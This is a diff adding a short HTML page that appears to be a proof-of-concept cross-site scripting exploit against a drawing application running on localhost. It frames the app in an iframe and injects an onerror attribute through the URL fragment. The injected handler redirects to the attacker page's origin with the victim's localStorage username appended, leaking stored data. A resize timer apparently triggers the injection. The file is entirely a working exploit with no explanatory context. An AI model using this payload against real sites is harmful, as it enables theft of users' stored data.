@@ -1,0 +1,11 @@
+<html>
+<head></head>
+<body>
+    <iframe id="i" width="300" height="300" src=""></iframe>
+    <script>
+        var i=document.querySelector("#i");
+        setTimeout(()=>{i.width=1000;},1000);
+        i.src="http://localhost:4000/drawing/abcd#src=1&onerror=window.location%3d%60" + window.location.origin + "/${localStorage.username}%60&is";
+    </script>
+</body>
+</html>
